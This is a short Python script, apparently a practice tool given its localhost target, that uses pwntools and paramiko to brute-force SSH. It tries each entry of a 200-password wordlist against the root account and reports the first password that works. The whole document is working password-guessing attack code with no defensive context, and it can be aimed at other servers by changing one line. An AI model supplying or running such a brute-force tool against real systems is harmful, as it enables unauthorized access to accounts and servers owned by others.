from pwn import *
import paramiko

host = "127.0.0.1"
username = "root"
attempts = 0

with open("pass-list-200.txt", "r") as passlist:
	for passw in passlist:
		passw = passw.strip("\n")
		try:
			print ("[" + str(attempts) + "] " + "Intentando contraseña: " + passw)
			login = ssh(host=host, user=username, password=passw, timeout=1)
			if login.connected():
				print ("Contraseña valida encontrada !!! " + passw)
				login.close()
				break
			else:
				login.close()
		except paramiko.ssh_exception.AuthenticationException:
			print ("Contraseña invalida!")
		except paramiko.ssh_exception.SSHException:
			continue
		attempts = attempts + 1
